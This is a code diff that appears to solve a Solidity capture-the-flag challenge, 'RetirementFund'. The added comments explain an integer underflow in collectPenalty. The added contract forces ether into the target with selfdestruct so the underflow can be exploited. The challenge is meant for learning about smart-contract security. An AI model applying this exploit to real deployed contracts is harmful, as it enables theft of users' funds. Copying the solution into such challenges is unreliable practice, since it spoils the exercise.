@@ -52,10 +52,23 @@ contract RetirementFund {
 // Write your exploit contract below
 contract ExploitContract {
     RetirementFund public retirementFund;
-
+    // I'm player. I can't call withdraw due to it checks the owner.
+    // So the collectPenalty is the entry that I can exploit.
+    // Is there some way to pass (withdrawn > 0) ? It's startBalance - balanceNow.
+    // With the startBalance is fixed, the balance of the contract is only state I can exploit.
+    // Make the withdrawn overflow through balance > startBalance.
+    // deposit some ether, and  call collectPenalty then, withdrawn > 0 will be passed.
+    // But there is not any function payable. I can't deposit to it directly.
+    // Selfdestruct is a way to deposit to it.
     constructor(RetirementFund _retirementFund) {
         retirementFund = _retirementFund;
     }
 
     // write your exploit functions below
+    function destory() public {
+        selfdestruct(payable(address(retirementFund)));
+    }
+
+    receive() external payable {}
+
 }
